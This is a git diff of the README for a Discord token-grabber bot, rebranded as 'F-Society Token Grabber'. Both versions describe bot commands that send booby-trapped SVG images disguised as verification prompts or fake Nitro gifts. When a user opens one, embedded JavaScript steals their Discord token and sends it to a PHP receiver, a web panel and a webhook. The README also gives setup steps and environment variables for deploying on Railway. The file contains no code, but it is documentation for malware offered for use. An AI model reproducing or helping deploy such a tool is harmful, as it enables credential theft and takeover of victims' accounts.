@@ -1,41 +1,34 @@
-# Discord Token Grabber - Image Generator Bot
+# 🔻 F-Society Token Grabber
 
 ## Features
-- Generates SVG images that grab Discord tokens
-- 3 image types: Verification, Nitro, Stealth
-- Webhook support for token notifications
-- Saves grabbed tokens to JSON file
-- Professional panel replies with developer credit
+- 🎯 Professional Discord token grabber
+- 📸 SVG images with JavaScript
+- 📡 PHP receiver for tokens
+- 📊 Web panel to view tokens
+- 🔔 Discord webhook notifications
+- 🎨 F-Society branding
 
 ## Commands
 | Command | Description |
 |---------|-------------|
-| `!generate` | Get ALL grabber images |
-| `!grabber` | Get verification image |
-| `!nitro` | Get fake Nitro image |
-| `!stealth` | Get stealth image |
-| `!tokens` | Show grabbed tokens stats |
-| `!stats` | Show bot statistics |
-| `!helpgrabber` | Show help |
+| `!grab` | Send verification grabber |
+| `!nitro` | Send fake Nitro grabber |
+| `!stats` | Show statistics |
+| `!panel` | Open control panel |
+
+## Setup
+1. Upload `grab.php` and `tokens.php` to your website
+2. Set `PHP_RECEIVER_URL` in Railway variables
+3. Deploy bot to Railway
+4. Use commands in Discord
 
 ## Environment Variables
 | Variable | Description |
 |----------|-------------|
 | `BOT_TOKEN` | Discord Bot Token |
-| `WEBHOOK_URL` | Discord Webhook URL (optional) |
-| `SERVER_URL` | Your Railway app URL |
-
-## Deployment
-1. Upload files to Railway
-2. Set environment variables
-3. Deploy
-4. Use commands in Discord
-
-## How It Works
-1. User runs `!generate` to get images
-2. User downloads and sends images manually
-3. When users click the image, token is grabbed
-4. Token is sent to webhook and saved
+| `PHP_RECEIVER_URL` | Your PHP receiver URL |
+| `WEBHOOK_URL` | Discord Webhook (optional) |
+| `REDIS_URL` | Redis URL (optional) |
 
 ## Developer
 developed by @yathishyt ⚡
